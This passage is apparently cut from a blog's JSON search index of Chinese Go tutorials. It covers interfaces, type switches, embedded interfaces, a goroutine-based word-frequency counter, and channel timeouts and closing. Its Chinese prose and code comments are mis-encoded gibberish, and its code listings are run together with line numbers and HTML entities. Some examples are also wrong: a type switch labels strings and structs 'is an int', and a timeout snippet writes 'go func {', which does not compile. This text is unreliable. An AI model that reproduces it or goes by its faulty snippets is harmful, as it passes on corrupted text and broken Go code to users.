é€’ç»™è¯¥å‡½æ•°ã€‚æ¥å£æ˜¯å®Œå…¨æŠ½è±¡çš„ï¼Œä¸èƒ½å®ä¾‹åŒ–ã€‚æ¥å£èƒ½å­˜å‚¨ä»»ä½•å®ç°äº†è¯¥æ¥å£çš„ç±»å‹ã€‚ç›´æ¥çœ‹ä¾‹å­å§ï¼Œåˆ›å»ºæºæ–‡ä»¶ interface_t.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package mainimport &quot;fmt&quot;type Human struct &#123; // ç»“æ„ä½“ name string age int phone string&#125;//Humanå®ç°SayHiæ–¹æ³•func (h Human) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s you can call me on %s\\n&quot;, h.name, h.phone)&#125;//Humanå®ç°Singæ–¹æ³•func (h Human) Sing(lyrics string) &#123; fmt.Println(&quot;La la la la...&quot;, lyrics)&#125;type Student struct &#123; Human //åŒ¿åå­—æ®µ school string loan float32&#125;type Employee struct &#123; Human //åŒ¿åå­—æ®µ company string money float32&#125;// Employeeé‡è½½Humançš„SayHiæ–¹æ³•func (e Employee) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s, I work at %s. Call me on %s\\n&quot;, e.name, e.company, e.phone)&#125;// Interface Menè¢«Human,Studentå’ŒEmployeeå®ç°// å› ä¸ºè¿™ä¸‰ä¸ªç±»å‹éƒ½å®ç°äº†è¿™ä¸¤ä¸ªæ–¹æ³•type Men interface &#123; SayHi() Sing(lyrics string)&#125;func main() &#123; mike := Student&#123;Human&#123;&quot;Mike&quot;, 25, &quot;222-222-XXX&quot;&#125;, &quot;MIT&quot;, 0.00&#125; paul := Student&#123;Human&#123;&quot;Paul&quot;, 26, &quot;111-222-XXX&quot;&#125;, &quot;Harvard&quot;, 100&#125; sam := Employee&#123;Human&#123;&quot;Sam&quot;, 36, &quot;444-222-XXX&quot;&#125;, &quot;Golang Inc.&quot;, 1000&#125; Tom := Employee&#123;Human&#123;&quot;Tom&quot;, 37, &quot;222-444-XXX&quot;&#125;, &quot;Things Ltd.&quot;, 5000&#125; //å®šä¹‰Menç±»å‹çš„å˜é‡i var i Men //ièƒ½å­˜å‚¨Student i = mike fmt.Println(&quot;This is Mike, a Student:&quot;) i.SayHi() i.Sing(&quot;November rain&quot;) //iä¹Ÿèƒ½å­˜å‚¨Employee i = Tom fmt.Println(&quot;This is Tom, an Employee:&quot;) i.SayHi() i.Sing(&quot;Born to be wild&quot;) //å®šä¹‰äº†slice Men fmt.Println(&quot;Let&#x27;s use a slice of Men and see what happens&quot;) x := make([]Men, 3) //è¿™ä¸‰ä¸ªéƒ½æ˜¯ä¸åŒç±»å‹çš„å…ƒç´ ï¼Œä½†æ˜¯ä»–ä»¬å®ç°äº†interfaceåŒä¸€ä¸ªæ¥å£ x[0], x[1], x[2] = paul, sam, mike for _, value := range x &#123; value.SayHi() &#125;&#125; æ¥å£å˜é‡å€¼çš„ç±»å‹* æ¥å£ç±»å‹å£°æ˜çš„å˜é‡é‡Œèƒ½å­˜å‚¨ä»»ä½•å®ç°äº†è¯¥æ¥å£çš„ç±»å‹çš„å€¼ã€‚ æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸ªå˜é‡é‡Œçš„å€¼çš„ç±»å‹ï¼Œé‚£ä¹ˆéœ€è¦æ€ä¹ˆåšå‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨ç±»å‹æ–­è¨€ï¼Œæˆ–è€…æ˜¯ switch ç±»å‹åˆ¤æ–­åˆ†æ”¯ã€‚ä»¥ä¸‹çš„ä¾‹å­ interface_t1.go æˆ‘ä»¬ä½¿ç”¨äº† switch ç±»å‹åˆ¤æ–­åˆ†æ”¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142/*ä½¿ç”¨äº†switch ç±»å‹åˆ¤æ–­åˆ†æ”¯*/package mainimport ( &quot;fmt&quot; &quot;strconv&quot;)type Element interface&#123;&#125;type List []Elementtype Person struct &#123; name string age int&#125;// å®ç°äº†fmt.Stringeræ¥å£func (p Person) String() string &#123; return &quot;(name: &quot; + p.name + &quot;- age: &quot; + strconv.Itoa(p.age) + &quot; years)&quot;&#125;func main() &#123; list := make(List, 4) list[0] = 1 list[1] = &quot;Hello&quot; list[2] = Person&#123;&quot;Dennis&quot;, 70&#125; list[3] = 1 + 2i for index, element := range list &#123; switch value := element.(type) &#123; case int: fmt.Printf(&quot;list[%d] is an int and its value is %d\\n&quot;, index, value) case string: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) case Person: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) default: fmt.Printf(&quot;list[%d] is of a different type&quot;, index) &#125; &#125;&#125; åµŒå…¥interface ç»“æ„ä½“ä¸­å¯ä»¥åµŒå…¥åŒ¿åå­—æ®µï¼Œå…¶å®åœ¨æ¥å£é‡Œä¹Ÿå¯ä»¥å†åµŒå…¥æ¥å£ã€‚å¦‚æœä¸€ä¸ª interface1 ä½œä¸º interface2 çš„ä¸€ä¸ªåµŒå…¥å­—æ®µï¼Œé‚£ä¹ˆ interface2 éšå¼çš„åŒ…å«äº† interface1 é‡Œçš„æ–¹æ³•ã€‚å¦‚ä¸‹ä¾‹å­ä¸­ï¼ŒInterface2 åŒ…å«äº† Interface1 çš„æ‰€æœ‰æ–¹æ³•ã€‚ 123456789type Interface1 interface &#123; Send() Receive()&#125;type Interface2 interface &#123; Interface1 Close()&#125;","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"æ¥å£","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/æ¥å£","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%8E%A5%E5%8F%A3/"}]},{"title":"Goé¢å‘å¯¹è±¡ç¼–ç¨‹6â€”â€”åµŒå…¥ interface","date":"2023-10-27T01:24:02.193Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/åµŒå…¥interface/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹6â€”â€”åµŒå…¥ interface/","text":"åœ¨å‰é¢çš„è¯¾ç¨‹ä¸­æˆ‘ä»¬å·²ç»çŸ¥é“åœ¨ç»“æ„ä½“ä¸­å¯ä»¥åµŒå…¥åŒ¿åå­—æ®µï¼Œå…¶å®åœ¨æ¥å£é‡Œä¹Ÿå¯ä»¥å†åµŒå…¥æ¥å£ã€‚å¦‚æœä¸€ä¸ª interface1 ä½œä¸º interface2 çš„ä¸€ä¸ªåµŒå…¥å­—æ®µï¼Œé‚£ä¹ˆ interface2 éšå¼çš„åŒ…å«äº† interface1 é‡Œçš„æ–¹æ³•ã€‚å¦‚ä¸‹ä¾‹å­ä¸­ï¼ŒInterface2 åŒ…å«äº† Interface1 çš„æ‰€æœ‰æ–¹æ³•ã€‚ 123456789type Interface1 interface &#123; Send() Receive()&#125;type Interface2 interface &#123; Interface1 Close()&#125;","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"åµŒå…¥interface","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/åµŒå…¥interface","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E5%B5%8C%E5%85%A5interface/"}]},{"title":"Goç®€æ˜æ‰‹å†Œâ€”â€”è¯é¢‘ç»Ÿè®¡ç»¼åˆæ¡ˆä¾‹","date":"2023-10-27T01:24:02.184Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/è¯é¢‘ç»Ÿè®¡ç»¼åˆæ¡ˆä¾‹/ã€Goç®€æ˜æ‰‹å†Œã€‘è¯é¢‘ç»Ÿè®¡ç»¼åˆæ¡ˆä¾‹/","text":"IMG-20240814102207036.go å®ç° è¯é¢‘ç»Ÿè®¡çš„ç¨‹åºé€»è¾‘å¾ˆç®€å•ã€‚æˆ‘ä»¬é¦–å…ˆä¼šåˆ›å»ºä¸€ä¸ªæ˜ å°„ï¼Œç„¶åè¯»å–æ–‡ä»¶çš„æ¯ä¸€è¡Œï¼Œæå–å•è¯ï¼Œç„¶åæ›´æ–°æ˜ å°„ä¸­å•è¯æ‰€å¯¹åº”çš„æ•°é‡å³å¯ã€‚ ä¸ºäº†æ¼”ç¤ºé¢å‘å¯¹è±¡å’Œ goroutine çš„ä½¿ç”¨ï¼Œæˆ‘ä»¬å°†åŸºç¡€æ˜ å°„ç±»å‹å°è£…æˆäº†ä¸€ä¸ªç»Ÿè®¡å•è¯é¢‘ç‡çš„åŒ…ã€‚æˆ‘ä»¬åœ¨åŸºç¡€æ˜ å°„ç±»å‹ä¸Šåˆ›å»ºäº†ç±»å‹ WordCoundï¼Œç„¶åä¸ºè¯¥ç±»å‹äº†å®ç°äº†å…³é”®æ–¹æ³• UpdateFreq() å’Œ WordFreqCounter()ï¼Œå…¶ä¸­å‰è€…ä¼šè¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶ç»Ÿè®¡è¯¥æ–‡ä»¶ä¸­çš„æ‰€æœ‰å•è¯çš„è¯é¢‘ï¼Œåè€…é€šè¿‡ goroutine å®ç°äº†å¹¶å‘ç»Ÿè®¡ã€‚ å…¶å¹¶å‘é€»è¾‘æ˜¯ï¼šå¯¹äºæ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ª goroutineï¼Œåœ¨è¿™ä¸ª goroutine å†…éƒ¨è°ƒç”¨ UpdateFreq() æ–¹æ³•ç»Ÿè®¡å¯¹åº”æ–‡ä»¶çš„è¯é¢‘ï¼Œå½“ç»Ÿè®¡å®Œæˆä»¥åä¼šå°†æ˜ å°„ä¸­æ¯ä¸€å¯¹é”®å€¼è½¬åŒ–ä¸º Pair ç»“æ„å‘é€åˆ° results é€šé“ï¼Œå¹¶åœ¨å‘é€å®Œæˆæ—¶å€™å‘é€ä¸€ä¸ªç©ºç»“æ„ä½“çš„å€¼åˆ° done é€šé“ä»¥è¡¨ç¤ºè‡ªå·±çš„ä»»åŠ¡å·²ç»å®Œæˆã€‚ç”±äº map æ˜ å°„ç»“æ„ä¸æ”¯æŒå¹¶å‘å†™æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡ result é€šé“æ¥ä¿è¯æ¯æ¬¡åªæœ‰ä¸€ä¸ª goroutine èƒ½æ›´æ–°æ˜ å°„ã€‚åˆå› ä¸ºå½“æ‰€æœ‰çš„ goroutine ç»“æŸä»¥åï¼Œæœ‰å¯èƒ½ results é€šé“ä¸­è¿˜æœ‰æ²¡æ¥å¾—åŠå¤„ç†çš„æ•°æ®ï¼Œæ‰€ä»¥åœ¨ WordFreqCounter() çš„ç»“å°¾æˆ‘ä»¬åˆå¼€å¯äº†ä¸€ä¸ª for å¾ªç¯å¤„ç† results é€šé“ä¸­çš„å‰©ä½™æ•°æ®ã€‚è¯´äº†è¿™ä¹ˆå¤šï¼Œæˆ‘ä»¬ç›´æ¥å†™ä»£ç å§ã€‚ åœ¨ $GOPATH/src/wordcount ç›®å½•ä¸­åˆ›å»ºæ–‡ä»¶ wordcount.goï¼Œè¾“å…¥ä»¥ä¸‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176package wordcountimport ( &quot;bufio&quot; &quot;fmt&quot; &quot;io&quot; &quot;log&quot; &quot;os&quot; &quot;sort&quot; &quot;strings&quot; &quot;unicode&quot; &quot;unicode/utf8&quot;)type Pair struct &#123; Key string Value int&#125;// PariListå®ç°äº†sortæ¥å£ï¼Œå¯ä»¥ä½¿ç”¨sort.Sortå¯¹å…¶æ’åºtype PairList []Pairfunc (p PairList) Swap(i, j int) &#123; p[i], p[j] = p[j], p[i] &#125;func (p PairList) Len() int &#123; return len(p) &#125;func (p PairList) Less(i, j int) bool &#123; return p[j].Value &lt; p[i].Value &#125; // é€†åº// æå–å•è¯func SplitOnNonLetters(s string) []string &#123; notALetter := func(char rune) bool &#123; return !unicode.IsLetter(char) &#125; return strings.FieldsFunc(s, notALetter)&#125;/* åŸºäºmapå®ç°äº†ç±»å‹WordCount, å¹¶å¯¹æœŸå®ç°äº†Merge(), Report(), SortReport(), UpdateFreq(), WordFreqCounter() æ–¹æ³•*/type WordCount map[string]int// ç”¨äºåˆå¹¶ä¸¤ä¸ªWordCountfunc (source WordCount) Merge(wordcount WordCount) WordCount &#123; for k, v := range wordcount &#123; source[k] += v &#125; return source&#125;// æ‰“å°è¯é¢‘ç»Ÿè®¡æƒ…å†µfunc (wordcount WordCount) Report() &#123; words := make([]string, 0, len(wordcount)) wordWidth, frequencyWidth := 0, 0 for word, frequency := range wordcount &#123; words = append(words, word) if width := utf8.RuneCountInString(word); width &gt; wordWidth &#123; wordWidth = width &#125; if width := len(fmt.Sprint(frequency)); width &gt; frequencyWidth &#123; frequencyWidth = width &#125; &#125; sort.Strings(words) gap := wordWidth + frequencyWidth - len(&quot;Word&quot;) - len(&quot;Frequency&quot;) fmt.Printf(&quot;Word %*s%s\\n&quot;, gap, &quot; &quot;, &quot;Frequency&quot;) for _, word := range words &#123; fmt.Printf(&quot;%-*s %*d\\n&quot;, wordWidth, word, frequencyWidth, wordcount[word]) &#125;&#125;// ä»å¤šåˆ°å°‘æ‰“å°è¯é¢‘func (wordcount WordCount) SortReport() &#123; p := make(PairList, len(wordcount)) i := 0 for k, v := range wordcount &#123; // å°†wordcount mapè½¬æ¢æˆPairList p[i] = Pair&#123;k, v&#125; i++ &#125; sort.Sort(p) // å› ä¸ºPairListå®ç°äº†æ’åºæ¥å£ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨sort.Sort()å¯¹å…¶æ’åº wordWidth, frequencyWidth := 0, 0 for _, pair := range p &#123; word, frequency := pair.Key, pair.Value if width := utf8.RuneCountInString(word); width &gt; wordWidth &#123; wordWidth = width &#125; if width := len(fmt.Sprint(frequency)); width &gt; frequencyWidth &#123; frequencyWidth = width &#125; &#125; gap := wordWidth + frequencyWidth - len(&quot;Word&quot;) - len(&quot;Frequency&quot;) fmt.Printf(&quot;Word %*s%s\\n&quot;, gap, &quot; &quot;, &quot;Frequency&quot;) for _, pair := range p &#123; fmt.Printf(&quot;%-*s %*d\\n&quot;, wordWidth, pair.Key, frequencyWidth, pair.Value) &#125;&#125;// ä»æ–‡ä»¶ä¸­è¯»å–å•è¯ï¼Œå¹¶æ›´æ–°å…¶å‡ºç°çš„æ¬¡æ•°func (wordcount WordCount) UpdateFreq(filename string) &#123; var file *os.File var err error if file, err = os.Open(filename); err != nil &#123; log.Println(&quot;failed to open the file: &quot;, err) return &#125; defer file.Close() // æœ¬å‡½æ•°é€€å‡ºä¹‹å‰æ—¶ï¼Œå…³é—­æ–‡ä»¶ reader := bufio.NewReader(file) for &#123; line, err := reader.ReadString(&#x27;\\n&#x27;) for _, word := range SplitOnNonLetters(strings.TrimSpace(line)) &#123; if len(word) &gt; utf8.UTFMax || utf8.RuneCountInString(word) &gt; 1 &#123; wordcount[strings.ToLower(word)] += 1 &#125; &#125; if err != nil &#123; if err != io.EOF &#123; log.Println(&quot;failed to finish reading the file: &quot;, err) &#125; break &#125; &#125;&#125;// å¹¶å‘ç»Ÿè®¡å•è¯é¢‘æ¬¡func (wordcount WordCount) WordFreqCounter(files []string) &#123; results := make(chan Pair, len(files)) // goroutine å°†ç»“æœå‘é€åˆ°è¯¥channel done := make(chan struct&#123;&#125;, len(files)) // æ¯ä¸ªgoroutineå·¥ä½œå®Œæˆåï¼Œå‘é€ä¸€ä¸ªç©ºç»“æ„ä½“åˆ°è¯¥channelï¼Œè¡¨ç¤ºå·¥ä½œå®Œæˆ for i := 0; i &lt; len(files); &#123; // æœ‰å¤šå°‘ä¸ªæ–‡ä»¶å°±å¼€å¯å¤šå°‘ä¸ªgoroutine, ä½¿ç”¨åŒ¿åå‡½æ•°çš„æ–¹å¼ go func(done chan&lt;- struct&#123;&#125;, results chan&lt;- Pair, filename string) &#123; wordcount := make(WordCount) wordcount.UpdateFreq(filename) for k, v := range wordcount &#123; pair := Pair&#123;k, v&#125; results &lt;- pair &#125; done &lt;- struct&#123;&#125;&#123;&#125; &#125;(done, results, files[i]) i++ &#125; for working := len(files); working &gt; 0; &#123; // ç›‘å¬é€šé“ï¼Œç›´åˆ°æ‰€æœ‰çš„å·¥ä½œgoroutineå®Œæˆä»»åŠ¡æ—¶æ‰é€€å‡º select &#123; case pair := &lt;-results: // æ¥æ”¶å‘é€åˆ°é€šé“ä¸­çš„ç»Ÿè®¡ç»“æœ wordcount[pair.Key] += pair.Value case &lt;-done: // åˆ¤æ–­å·¥ä½œgoroutineæ˜¯å¦å…¨éƒ¨å®Œæˆ working-- &#125; &#125;DONE: // å†æ¬¡å¯åŠ¨forå¾ªç¯å¤„ç†é€šé“ä¸­è¿˜æœªå¤„ç†å®Œçš„å€¼ for &#123; select &#123; case pair := &lt;-results: wordcount[pair.Key] += pair.Value default: break DONE &#125; &#125; close(results) close(done)&#125; ç„¶ååœ¨ $GOPATH ç›®å½•ä¸­åˆ›å»ºæ–‡ä»¶ wordfreq.goï¼Œè¾“å…¥ä»¥ä¸‹æºç ï¼š 123456789101112131415161718192021222324package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;path/filepath&quot; &quot;wordcount&quot;)func main() &#123; if len(os.Args) == 1 || os.Args[1] == &quot;-h&quot; || os.Args[1] == &quot;--help&quot; &#123; fmt.Printf(&quot;usage: %s &lt;file1&gt; [&lt;file2&gt; [... &lt;fileN&gt;]]\\n&quot;, filepath.Base(os.Args[0])) os.Exit(1) &#125; wordcounter := make(wordcount.WordCount) // for _, filename := range os.Args[1:] &#123; // wordcount.UpdateFreq(filename) // &#125; wordcounter.WordFreqCounter(os.Args[1:]) wordcounter.SortReport()&#125;","tags":[{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Code","slug":"Code","permalink":"https://hodlyounger.github.io/tags/Code/"},{"name":"GO","slug":"GO","permalink":"https://hodlyounger.github.io/tags/GO/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"è¯é¢‘ç»Ÿè®¡ç»¼åˆæ¡ˆä¾‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/è¯é¢‘ç»Ÿè®¡ç»¼åˆæ¡ˆä¾‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E8%AF%8D%E9%A2%91%E7%BB%9F%E8%AE%A1%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B/"}]},{"title":"Goå¹¶å‘ç¼–ç¨‹â€”â€”è¶…æ—¶æœºåˆ¶","date":"2023-10-27T01:24:02.180Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/è¶…æ—¶æœºåˆ¶/ã€Goç®€æ˜æ‰‹å†Œã€‘Goå¹¶å‘ç¼–ç¨‹â€”â€”è¶…æ—¶æœºåˆ¶/","text":"é€šè¿‡å‰é¢çš„å†…å®¹æˆ‘ä»¬äº†è§£åˆ°ï¼Œchannel çš„è¯»å†™æ“ä½œéå¸¸ç®€å•ï¼Œåªéœ€è¦é€šè¿‡ &lt;- æ“ä½œç¬¦å³å¯å®ç°ï¼Œä½†æ˜¯ channel çš„ä½¿ç”¨ä¸å½“å´ä¼šå¸¦æ¥å¤§éº»çƒ¦ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¹‹å‰çš„ä¸€æ®µä»£ç ï¼š 123a := make(chan int)a &lt;- 1z := &lt;-a è§‚å¯Ÿä¸Šé¢ä¸‰è¡Œä»£ç ï¼Œç¬¬ 2 è¡Œå¾€ channel å†…å†™å…¥äº†æ•°æ®ï¼Œç¬¬ 3 è¡Œä» channel ä¸­è¯»å–äº†æ•°æ®ï¼Œå¦‚æœç¨‹åºè¿è¡Œæ­£å¸¸å½“ç„¶ä¸ä¼šå‡ºä»€ä¹ˆé—®é¢˜ï¼Œå¯å¦‚æœç¬¬äºŒè¡Œæ•°æ®å†™å…¥å¤±è´¥ï¼Œæˆ–è€… channel ä¸­æ²¡æœ‰æ•°æ®ï¼Œé‚£ä¹ˆç¬¬ 3 è¡Œä»£ç ä¼šå› ä¸ºæ°¸è¿œæ— æ³•ä» a ä¸­è¯»å–åˆ°æ•°æ®è€Œä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ã€‚ç›¸åçš„ï¼Œå¦‚æœ channel ä¸­çš„æ•°æ®ä¸€ç›´æ²¡æœ‰è¢«è¯»å–ï¼Œé‚£ä¹ˆå†™å…¥æ“ä½œä¹Ÿä¼šä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ã€‚å¦‚æœä¸æ­£ç¡®å¤„ç†è¿™ä¸ªæƒ…å†µï¼Œå¾ˆå¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ª goroutine é”æ­»ï¼Œè¿™å°±æ˜¯è¶…æ—¶é—®é¢˜ã€‚Go è¯­è¨€æ²¡æœ‰é’ˆå¯¹è¶…æ—¶æä¾›ä¸“é—¨çš„å¤„ç†æœºåˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬å´å¯ä»¥åˆ©ç”¨ select æ¥å·§å¦™åœ°å®ç°è¶…æ—¶å¤„ç†æœºåˆ¶ï¼Œä¸‹é¢çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š 1234567891011t := make(chan bool)go func &#123; time.Sleep(1e9) //ç­‰å¾…1ç§’ t &lt;- true&#125;select &#123; case &lt;-ch: //ä»chä¸­è¯»å–æ•°æ® case &lt;-t: //å¦‚æœ1ç§’åæ²¡æœ‰ä»chä¸­è¯»å–åˆ°æ•°æ®ï¼Œé‚£ä¹ˆä»tä¸­è¯»å–ï¼Œå¹¶è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œ&#125; è¿™æ ·çš„æ–¹æ³•å°±å¯ä»¥è®©ç¨‹åºåœ¨ç­‰å¾… 1 ç§’åç»§ç»­æ‰§è¡Œï¼Œè€Œä¸ä¼šå› ä¸º ch è¯»å–ç­‰å¾…è€Œå¯¼è‡´ç¨‹åºåœæ»ï¼Œä»è€Œå·§å¦™åœ°å®ç°äº†è¶…æ—¶å¤„ç†æœºåˆ¶ï¼Œè¿™ç§æ–¹æ³•ä¸ä»…ç®€å•ï¼Œåœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­ä¹Ÿæ˜¯éå¸¸å®ç”¨çš„ã€‚ channel çš„å…³é—­ channel çš„å…³é—­éå¸¸ç®€å•ï¼Œä½¿ç”¨ Go è¯­è¨€å†…ç½®çš„ close() å‡½æ•°å³å¯å…³é—­ channelï¼Œç¤ºä¾‹ï¼š 12ch := make(chan int)close(ch) å…³é—­äº† channel åå¦‚ä½•æŸ¥çœ‹ channel æ˜¯å¦å…³é—­æˆåŠŸäº†å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯»å– channel æ—¶é‡‡ç”¨å¤šé‡è¿”å›å€¼çš„æ–¹å¼ï¼Œç¤ºä¾‹ï¼š 1x, ok := &lt;-ch é€šè¿‡æŸ¥çœ‹ç¬¬äºŒä¸ªè¿”å›å€¼çš„ bool å€¼å³å¯åˆ¤æ–­ channel æ˜¯å¦å…³é—­ï¼Œè‹¥ä¸º false åˆ™è¡¨ç¤º channel è¢«å…³é—­ï¼Œåä¹‹åˆ™æ²¡æœ‰å…³é—­ã€‚","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"å¹¶å‘ä¸å¹¶è¡Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"è¶…æ—¶æœºåˆ¶","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡